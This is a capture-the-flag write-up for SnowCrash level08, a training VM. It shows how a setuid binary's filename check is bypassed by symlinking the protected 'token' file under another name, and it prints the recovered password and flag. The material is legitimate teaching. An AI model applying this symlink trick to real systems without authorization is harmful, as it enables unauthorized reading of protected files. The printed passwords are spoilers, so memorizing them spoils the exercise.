
****************************************
*               Level 08               *
****************************************

Description :

Let's see what we have here :

level08@SnowCrash:~$ ls
level08  token

level08@SnowCrash:~$ ls -la
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rw-------  1 flag08  flag08    26 Mar  5  2016 token

So, here we have a binary named "level08" and a file named "token", let's see what they do :

level08@SnowCrash:~$ cat token
cat: token: Permission denied
bash: ./token: Permission denied
level08@SnowCrash:~$ 

Ok, so we don't have access to this (normal as we saw in "ls -la")... Let's try to run the binary (which we have the right to, since we are in the group named "level08") :

level08@SnowCrash:~$ ./level08
./level08 [file to read]

Ok, let's try with a file as an argument then :

level08@SnowCrash:~$ ./level08 token
You may not access 'token'

Nothing... Let's try to do the same thing with another argument :

level08@SnowCrash:~$ ./level08 ok
level08: Unable to open ok: No such file or directory

Ok, so it must be a real file. Let's try to create one file named "ok" inside the "/tmp" directory (in which I have the right to create files) :

level08@SnowCrash:~$ echo hello > /tmp/ok
level08@SnowCrash:~$ cat /tmp/ok
hello

Ok, we are good, let's try it :

level08@SnowCrash:~$ ./level08 /tmp/ok
hello

Ok, it just prints whatever I wrote in my file... Nothing there...

But when we did this earlier :

level08@SnowCrash:~$ ./level08 token
You may not access 'token'

It didn't print me the token. It just printed a string "You may not access 'token'". But it didn't cause an error either. So, maybe I need to find a way to open the "token" file with the binary "level08" somehow...

Let's try to chage the name of the file "token" :

level08@SnowCrash:~$ mv token ok
mv: cannot move `token' to `ok': Permission denied

Nothing... Let's do the opposite : let's create a new file named "token" :

level08@SnowCrash:~$ echo hello > /tmp/token
level08@SnowCrash:~$ cat /tmp/token
hello

Now let's give it as an argument to the binary :

level08@SnowCrash:~$ ./level08 /tmp/token
You may not access '/tmp/token'

So, if we give our binary a file named "token", it just won’t read it. Maybe it checks if the file is named “token,” and if it is, it refuses to open it and just prints the string "You may not access '<filenmae>'".

Interesting.. how can we bypass this ? Since we can't rename the file "token" to something else, let's try to create a symlink to it under another name (for example "test") :

level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/test
level08@SnowCrash:~$ ./level08 /tmp/test
quif5eloekouj29ke0vouxean

So now we have something, let's use it :

level08@SnowCrash:~$ su level09
Password: quif5eloekouj29ke0vouxean
su: Authentication failure

So, it's not the flag for "level09", maybe it's the password of the user "flag08" then ? 

level08@SnowCrash:~$ su flag08
Password: quif5eloekouj29ke0vouxean
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
flag08@SnowCrash:~$ su level09
Password: 25749xKZ8L7DkSCwJkT9dyv6f

level09@SnowCrash:~$ 
